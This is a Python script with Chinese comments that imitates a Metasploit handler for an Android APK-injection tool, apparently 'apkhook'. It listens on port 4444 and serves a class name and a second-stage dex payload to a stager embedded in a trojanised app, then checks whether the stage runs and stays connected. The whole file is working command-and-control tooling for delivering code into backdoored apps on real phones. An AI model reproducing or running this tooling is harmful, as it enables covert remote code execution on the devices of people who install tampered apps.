#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""极简 msf handler 复现器 —— 不装 Metasploit 也能验证 stager 是否正常。

背景
----
本工具内置的 Android stager（`libs/MsfDexDir/classes.dex`）连上 handler 之后，
只做两件事：从 socket 读两个「4 字节大端长度 + 数据」的块 ——
  1) 类名（如 `com.apkhook.stage.Stage`）
  2) stage 的 dex 字节
然后它把 stage 写进 `filesDir/<随机>.jar`、`DexClassLoader` 加载、`newInstance()`、
调 `start(DataInputStream, OutputStream, Object[])`。

所以只要按这个协议回两个 blob，就能在真机上判断 stage 到底加载成功没有，
完全不需要 msf。配合 `adb logcat -s apkhook` 使用：
  * 正常：`stager: stage saved read-only` + 你自己的 stage 里的日志
  * 失败：`stager: stage load or exec failed` + 完整堆栈
  * 旧版 stager（2.0 及以前）：什么日志都没有，socket 直接断，反复重连

用法
----
    # 1) 先准备一个 stage.dex（随便一个带 start(DataInputStream,OutputStream,[Object]) 的类）
    #    例：见 docs 里的最小样例，或用 smali.jar 自己编一个
    # 2) 起 handler（默认监听 0.0.0.0:4444）
    python tools/fake_handler.py 4444 com.apkhook.stage.Stage stage.dex
    # 3) 手机上启动注入了 payload 的 App，观察本脚本输出与 logcat

注意：这是**验证工具**，不是功能完整的 handler；它不会回显 meterpreter 的协议，
只用来确认「stage 能被加载并执行」。
"""
import socket
import struct
import sys
import time

HOST = '0.0.0.0'
RECV_TIMEOUT = 3.0
ALIVE_SECONDS = 40


def blob(data):
    return struct.pack('>i', len(data)) + data


def serve(port, class_name, stage_path):
    try:
        stage = open(stage_path, 'rb').read()
    except OSError as exc:
        print('[!] 读不到 stage 文件 %s: %s' % (stage_path, exc))
        return 2
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, port))
    srv.listen(8)
    print('[+] listening on %s:%d, class=%s, stage=%s (%d bytes)'
          % (HOST, port, class_name, stage_path, len(stage)))
    index = 0
    while True:
        conn, addr = srv.accept()
        index += 1
        print('[+] #%d connection from %s:%d' % (index, addr[0], addr[1]))
        try:
            conn.settimeout(RECV_TIMEOUT)
            try:
                head = conn.recv(4096)
                print('    client sent %d bytes: %r' % (len(head), head[:32]))
            except socket.timeout:
                print('    client sent nothing within %.0fs' % RECV_TIMEOUT)
            conn.sendall(blob(class_name.encode()) + blob(stage))
            print('    stage sent (%d bytes)' % len(stage))
            conn.settimeout(None)
            deadline = time.time() + ALIVE_SECONDS
            closed = False
            while time.time() < deadline:
                try:
                    data = conn.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    print('    [-] client closed the socket (stage died)')
                    closed = True
                    break
                print('    client echoed %d bytes' % len(data))
            if not closed:
                print('    [+] stage stayed alive for %ds' % ALIVE_SECONDS)
        except Exception as exc:                     # noqa: BLE001 - 排障工具，打印就好
            print('    [!] %s: %s' % (type(exc).__name__, exc))
        finally:
            conn.close()
    return 0


def main(argv):
    port = int(argv[1]) if len(argv) > 1 else 4444
    class_name = argv[2] if len(argv) > 2 else 'com.apkhook.stage.Stage'
    stage_path = argv[3] if len(argv) > 3 else 'stage.dex'
    try:
        return serve(port, class_name, stage_path)
    except KeyboardInterrupt:
        print('\n[+] bye')
        return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
